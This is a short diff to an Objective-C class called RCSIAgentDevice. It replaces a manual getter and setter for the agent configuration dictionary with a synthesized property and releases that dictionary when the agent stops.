@@ -18,6 +18,8 @@ static RCSIAgentDevice *sharedAgentDevice = nil;
 
 @implementation RCSIAgentDevice
 
+@synthesize mAgentConfiguration;
+
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
@@ -233,6 +235,9 @@ static RCSIAgentDevice *sharedAgentDevice = nil;
     [mAgentConfiguration setObject: AGENT_STOPPED
                             forKey: @"status"];
   
+  [mAgentConfiguration release];
+  mAgentConfiguration = nil;
+  
   [outerPool release];
 }
 
@@ -261,19 +266,5 @@ static RCSIAgentDevice *sharedAgentDevice = nil;
 #pragma mark -
 #pragma mark Getter/Setter
 #pragma mark -
-
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
-{
-  if (aConfiguration != mAgentConfiguration)
-  {
-    [mAgentConfiguration release];
-    mAgentConfiguration = [aConfiguration retain];
-  }
-}
-
-- (NSMutableDictionary *)mAgentConfiguration
-{
-  return mAgentConfiguration;
-}
 
 @end
